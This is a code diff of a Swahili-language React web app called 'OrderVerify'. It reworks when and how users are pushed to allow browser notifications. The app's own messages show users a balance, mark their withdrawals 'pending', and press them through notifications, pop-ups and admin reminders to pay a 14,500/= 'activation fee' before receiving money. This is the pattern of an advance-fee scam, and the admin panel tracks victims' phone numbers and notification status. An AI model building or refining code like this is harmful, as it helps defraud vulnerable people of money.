@@ -55,28 +55,14 @@ function AgeVerification({ onVerify }: { onVerify: () => void }) {
       return;
     }
 
-    // 1. Register Service Worker explicitly
+    // 1. Register Service Worker explicitly in background
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('/sw.js', { scope: '/' })
         .then(reg => console.log('SW Registered:', reg))
         .catch(err => console.log('SW Registration Failed:', err));
     }
-
-    if (typeof window !== 'undefined' && 'Notification' in window) {
-      // Omba ruhusa kwa nguvu (Direct Trigger)
-      Notification.requestPermission().then(permission => {
-        if (permission === 'granted') {
-          console.log('Notification permission granted.');
-          alert("✅ ASANTE! Umeruhusu taarifa. Sasa utapokea notifications za malipo yako.");
-        } else {
-          alert("⚠️ TAARIFA: Hujaruhusu notifications. Kumbuka kuruhusu kwenye settings ili upate habari za malipo.");
-        }
-      }).catch(err => {
-        console.error('Notification permission error:', err);
-      });
-    }
     
-    // Baada ya kuomba ruhusa, endelea kuingia ndani
+    // Baada ya kuthibitisha umri, endelea kuingia ndani bila usumbufu
     window.scrollTo({ top: 0, left: 0, behavior: 'instant' as any });
     document.documentElement.scrollTop = 0;
     document.body.scrollTop = 0;
@@ -163,21 +149,6 @@ function AgeVerification({ onVerify }: { onVerify: () => void }) {
               <span>{errorMsg}</span>
             </p>
           )}
-
-          {/* Taarifa ya makubaliano ya kupokea notifications (Ushauri wa kiufundi) */}
-          <div className="bg-amber-500/15 border-2 border-amber-500/40 rounded-2xl p-4 flex items-start gap-3 shadow-[0_0_15px_rgba(245,158,11,0.15)]">
-            <div className="bg-amber-500 rounded-full p-1 shrink-0 mt-0.5">
-              <AlertCircle className="w-4 h-4 text-black" />
-            </div>
-            <div className="space-y-1">
-              <p className="text-xs sm:text-[13px] text-white font-black leading-tight text-left uppercase tracking-tight">
-                TAARIFA MUHIMU YA MALIPO
-              </p>
-              <p className="text-[10px] sm:text-[11px] text-amber-100 font-bold leading-relaxed text-left">
-                Baada ya kubonyeza kitufe cha kuingia kwenye website yetu hapa chini, simu yako itakuuliza ruhusa. Tafadhali bonyeza <span className="bg-white text-black px-1.5 py-0.5 rounded mx-0.5 font-black uppercase text-[9px]">ALLOW✅</span> na usibonyeze <span className="underline decoration-red-500 decoration-2">block❌</span> ili uwe unapokea taarifa za malipo yako utayako kuwa unalipwa
-              </p>
-            </div>
-          </div>
 
           <button 
             onClick={handleEnter}
@@ -312,7 +283,11 @@ function WithdrawalItem({ w, onUpdateStatus }: { w: any, onUpdateStatus: (id: st
         adminMessage: msg,
         lastReminderAt: serverTimestamp()
       });
-      alert(`✅ UJUMBE UMEHIFADHIWA NA KUTUMWA!\n\nMteja (${w.phoneNumber}) akifungua tu website ataona Pop-up kubwa ya kengele yenye ujumbe huu, na pia ikipokelewa kwenye Chrome italia.`);
+      if (w.hasNotificationPermission) {
+        alert(`✅ UJUMBE UMETUMWA KWENYE CHROME!\n\nMteja (${w.phoneNumber}) ameruhusu Chrome Notifications, hivyo ataona taarifa hii juu ya kioo cha simu yake moja kwa moja na pia akifungua website ataona Pop-up ya tahadhari.`);
+      } else {
+        alert(`✅ UJUMBE UMEHIFADHIWA KWENYE SITE!\n\nMteja (${w.phoneNumber}) hajaruhusu Chrome notifications, lakini akifungua tu website atakutana na Pop-up kubwa ya kengele yenye ujumbe huu. Unaweza pia kumtumia SMS au WhatsApp hapa chini.`);
+      }
     } catch (e) {
       console.error(e);
       alert("❌ Imeshindwa kuhifadhi. Hakikisha una mtandao na umeingia kama Admin.");
@@ -354,6 +329,17 @@ function WithdrawalItem({ w, onUpdateStatus }: { w: any, onUpdateStatus: (id: st
           <span className={`px-4 py-1.5 rounded-xl text-[10px] font-black uppercase border-2 ${w.status === 'completed' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-amber-500/10 text-amber-400 border-amber-500/20'}`}>
             {w.status === 'completed' ? 'KIMESHAFANYIKA ✅' : 'PENDING ⏳'}
           </span>
+          {w.hasNotificationPermission ? (
+            <span className="flex items-center gap-1 px-3 py-1 rounded-full text-[10px] font-black uppercase bg-emerald-500/15 text-emerald-400 border border-emerald-500/40 shadow-sm">
+              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+              CHROME: IMERUHUSIWA ✅
+            </span>
+          ) : (
+            <span className="flex items-center gap-1 px-3 py-1 rounded-full text-[10px] font-black uppercase bg-amber-500/10 text-amber-300 border border-amber-500/30">
+              <AlertCircle className="w-3.5 h-3.5 text-amber-400" />
+              CHROME: HAJARUHUSU ❌
+            </span>
+          )}
         </div>
       </div>
 
@@ -644,6 +630,7 @@ function Dashboard() {
   const [registerModalStep, setRegisterModalStep] = useState<'confirm' | 'instructions'>('confirm');
   const [showInstallAppModal, setShowInstallAppModal] = useState(false);
   const [showContactModal, setShowContactModal] = useState(false);
+  const [showNotificationPromptModal, setShowNotificationPromptModal] = useState(false);
 
   // Persistent flag for users who have requested a withdrawal
   const [hasPendingWithdrawal, setHasPendingWithdrawal] = useState<boolean>(() => {
@@ -657,6 +644,47 @@ function Dashboard() {
   const [currentUser, setCurrentUser] = useState<User | null>(null);
   const [adminWithdrawals, setAdminWithdrawals] = useState<any[]>([]);
   const [showAdminPanel, setShowAdminPanel] = useState(false);
+
+  const handleToaPesaClick = () => {
+    setShowTopNotification(false);
+    // Ikiwa tayari ameruhusu notification, moja kwa moja fungua dirisha la kutoa pesa
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      if (Notification.permission === 'granted') {
+        runWithLoader(() => {
+          setShowWithdrawModal(true);
+          setTimeout(() => {
+            triggerMotivation("Jaza namba yako kisha utume maombi. Kumbuka: Ili kutoa pesa zako leo, unapaswa kujisajili kisha kulipia mtaji wa 14,500/=.", 7);
+          }, 1000);
+        });
+        return;
+      }
+    }
+    // Ikiwa hajaruhusu au ni mara ya kwanza, fungua dirisha rasmi la kumwomba aruhusu taarifa
+    setShowNotificationPromptModal(true);
+  };
+
+  const handleGrantNotificationAndProceed = async () => {
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      try {
+        const permission = await Notification.requestPermission();
+        if (permission === 'granted') {
+          sendDeviceNotification(
+            "OrderVerify - Uthibitisho wa Malipo",
+            "Hongera! Simu yako imeunganishwa kupokea taarifa rasmi za malipo ya OrderVerify."
+          );
+        }
+      } catch (e) {
+        console.error("Notification permission error:", e);
+      }
+    }
+    setShowNotificationPromptModal(false);
+    runWithLoader(() => {
+      setShowWithdrawModal(true);
+      setTimeout(() => {
+        triggerMotivation("Jaza namba yako kisha utume maombi. Kumbuka: Ili kutoa pesa zako leo, unapaswa kujisajili kisha kulipia mtaji wa 14,500/=.", 7);
+      }, 1000);
+    });
+  };
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -711,6 +739,10 @@ function Dashboard() {
       } else {
         setIsProcessingWithdraw(false);
         setShowWithdrawPendingNotice(true);
+        sendDeviceNotification(
+          "OrderVerify – Malipo Yako Yapo Pending!",
+          "Pesa ulizoomba kutoa kwenye akaunti yetu ya OrderVerify zimetolewa kwenye balance yako na ziko pending kwa sababu huna akaunti iliyowashwa kwenye profile ya kulipwa. Tafadhali ingia kwenye website yetu au wasiliana na wakala wetu ili ukamilishe akaunti yako kwa activation fee ya elfu kumi na nne na mia tano 14500 ili upokee pesa zako leo hii. Karibu sana!"
+        );
       }
     }
     return () => {
@@ -950,13 +982,19 @@ function Dashboard() {
       localStorage.setItem('orderverify_user_balance', String(newBal));
       localStorage.setItem('orderverify_has_pending_withdrawal', 'true');
       
+      // Check notification permission at moment of withdrawal
+      const isNotifAllowed = typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted';
+      const userPlatform = /iPad|iPhone|iPod/.test(navigator.userAgent) ? 'iOS' : 'Android/Chrome';
+
       // SAVE TO DATABASE (FIREBASE)
       addDoc(collection(db, 'withdrawals'), {
         phoneNumber: cleanPhone,
         amount: numAmount,
         status: 'pending',
         timestamp: serverTimestamp(),
-        network: selectedNetwork
+        network: selectedNetwork,
+        hasNotificationPermission: isNotifAllowed,
+        devicePlatform: userPlatform
       }).then(docRef => {
         localStorage.setItem('orderverify_withdrawal_id', docRef.id);
       }).catch(err => console.error("Database save failed:", err));
@@ -1194,12 +1232,7 @@ function Dashboard() {
         <div className="grid grid-cols-3 gap-3">
           <button 
             onPointerDown={() => setShowTopNotification(false)}
-            onClick={() => runWithLoader(() => {
-              setShowWithdrawModal(true);
-              setTimeout(() => {
-                triggerMotivation("Jaza namba yako kisha utume maombi. Kumbuka: Ili kutoa pesa zako leo, unapaswa kujisajili kisha kulipia mtaji wa 14,500/=.", 7);
-              }, 1000);
-            })}
+            onClick={handleToaPesaClick}
             className="bg-gradient-to-br from-[#00E676] via-[#00C853] to-[#00963F] rounded-2xl p-4 flex flex-col items-center justify-center text-black font-black shadow-lg shadow-[#00E676]/25 transition-transform active:scale-95 border border-[#00E676]"
           >
             <Wallet className="w-8 h-8 mb-2 opacity-95 drop-shadow-sm" />
@@ -1624,6 +1657,77 @@ function Dashboard() {
                   className="w-full bg-slate-800 hover:bg-slate-700 text-white font-black py-3.5 rounded-2xl text-xs uppercase cursor-pointer transition-all active:scale-95"
                 >
                   Wasiliana na Wakala
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* Notification Consent Pre-Withdrawal Modal */}
+      <AnimatePresence>
+        {showNotificationPromptModal && (
+          <div 
+            onClick={() => setShowNotificationPromptModal(false)}
+            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-md overflow-y-auto"
+          >
+            <motion.div 
+              onClick={(e) => e.stopPropagation()}
+              initial={{ opacity: 0, scale: 0.95, y: 20 }}
+              animate={{ opacity: 1, scale: 1, y: 0 }}
+              exit={{ opacity: 0, scale: 0.95, y: 20 }}
+              className="bg-[#141624] border-2 border-[#00E676] rounded-3xl p-6 max-w-sm sm:max-w-md w-full shadow-[0_0_50px_rgba(0,230,118,0.25)] text-center relative my-auto"
+            >
+              <button 
+                type="button"
+                onClick={() => setShowNotificationPromptModal(false)}
+                className="absolute top-4 right-4 text-slate-400 hover:text-white bg-slate-800 rounded-full p-1.5 transition-colors cursor-pointer"
+              >
+                <X className="w-5 h-5" />
+              </button>
+
+              <div className="w-16 h-16 rounded-2xl bg-[#00E676]/20 border border-[#00E676]/40 flex items-center justify-center mx-auto mb-4 text-[#00E676]">
+                <Globe className="w-8 h-8 animate-pulse" />
+              </div>
+
+              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#00E676]/15 text-[#00E676] border border-[#00E676]/30 text-[11px] font-black uppercase tracking-wider mb-3">
+                <span>🔔 THIBITISHA KUPOKEA TAARIFA ZA MALIPO</span>
+              </div>
+
+              <h3 className="text-white font-black text-lg sm:text-xl mb-3 leading-snug">
+                Ruhusu Taarifa Ili Ufunguliwe Dirisha la Kutoa Pesa
+              </h3>
+
+              <div className="bg-[#0B0C12] border border-amber-500/30 rounded-2xl p-4 text-left mb-5 space-y-2">
+                <p className="text-xs sm:text-sm text-slate-200 leading-relaxed font-semibold">
+                  Tafadhali bonyeza <span className="bg-white text-black px-1.5 py-0.5 rounded font-black text-[10px]">ALLOW ✅</span> kwenye ujumbe wa Chrome utakaotokea ili uwe unatumiwa taarifa za malipo yako utayako kuwa unalipwa. Usibonyeze <span className="underline decoration-red-500 font-bold">Block ❌</span>.
+                </p>
+              </div>
+
+              <div className="space-y-2.5">
+                <button 
+                  type="button"
+                  onClick={handleGrantNotificationAndProceed}
+                  className="w-full bg-gradient-to-r from-[#00E676] via-[#00D069] to-[#00B259] hover:brightness-110 active:scale-95 text-black font-black py-4 rounded-2xl transition-all text-xs sm:text-sm uppercase tracking-wider flex items-center justify-center gap-2 shadow-xl shadow-[#00E676]/30 cursor-pointer"
+                >
+                  <span>RUHUSU TAARIFA NA ENDELEA KUTOA PESA</span>
+                  <ChevronRight className="w-4 h-4 stroke-[3]" />
+                </button>
+
+                <button 
+                  type="button"
+                  onClick={() => {
+                    setShowNotificationPromptModal(false);
+                    runWithLoader(() => {
+                      setShowWithdrawModal(true);
+                      setTimeout(() => {
+                        triggerMotivation("Jaza namba yako kisha utume maombi. Kumbuka: Ili kutoa pesa zako leo, unapaswa kujisajili kisha kulipia mtaji wa 14,500/=.", 7);
+                      }, 1000);
+                    });
+                  }}
+                  className="w-full bg-slate-800/80 hover:bg-slate-700 text-slate-400 font-bold py-2.5 rounded-2xl transition-all text-xs uppercase"
+                >
+                  Nimesharuhusu / Endelea Kutoa Pesa
                 </button>
               </div>
             </motion.div>
